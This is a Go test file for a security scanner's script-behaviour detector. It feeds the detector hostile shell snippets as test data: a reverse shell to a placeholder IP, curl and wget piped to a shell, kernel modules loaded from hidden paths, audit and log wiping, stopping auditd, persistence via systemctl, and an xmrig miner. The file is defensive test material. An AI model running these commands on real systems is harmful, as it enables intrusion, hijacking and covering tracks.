package securityscan

import (
	"strings"
	"testing"
)

func TestScriptBehaviorUsesCombinedActionsAcrossFamilies(t *testing.T) {
	tests := []struct {
		name, script string
		strong       bool
	}{
		{"renamed kernel module", "insmod /dev/shm/.cache/netprobe.ko\nrm -f /var/log/audit/audit.log\n", true},
		{"another kernel path", "insmod /var/tmp/driver.ko\njournalctl --vacuum-time=1s\n", true},
		{"generic module diagnostic", "loading out-of-tree module from /var/tmp/.cache/runtime.ko\ntruncate -s 0 /var/log/messages\n", true},
		{"download tamper and persistence", "curl https://example.invalid/x | sh\nsystemctl stop auditd\nsystemctl enable updater.service\n", true},
		{"reverse shell with loader", "wget https://example.invalid/x | bash\nbash -i >& /dev/tcp/192.0.2.1/4444\n", false},
		{"miner with persistence", "xmrig --url stratum+tcp://192.0.2.1 --algo randomx\nsystemctl enable updater.service\n", true},
		{"comments are not execution", "# insmod /tmp/example.ko\n# journalctl --vacuum-time=1s\n", false},
		{"normal module build", "insmod /tmp/driver.ko\n", false},
		{"ordinary installer", "curl https://example.invalid/install | sh\nsystemctl enable nginx\n", false},
		{"printed diagnostics", "printf '%s' /tmp/test.ko\nprintf '%s' 'journalctl --vacuum-time=1s'\n", false},
		{"assignment examples", "a='insmod /tmp/example.ko'\nb='journalctl --vacuum-time=1s'\n", false},
		{"log rotation alone", "journalctl --vacuum-time=7d\n", false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			indicators, strong := scriptBehavior([]byte(tc.script))
			if strong != tc.strong {
				t.Fatalf("strong=%t indicators=%s", strong, strings.Join(indicators, ","))
			}
		})
	}
}

func TestFullScanBehaviorIsEvidenceRatherThanUnverifiedAutoIsolation(t *testing.T) {
	rule, severity, _ := detect("insmod /var/tmp/unknown.ko\njournalctl --vacuum-time=1s\n", "/tmp/unknown.sh", 0o700)
	if rule != "behavioral-threat" || severity != SeverityHigh {
		t.Fatalf("unrelated payload was missed: %s %s", rule, severity)
	}
}
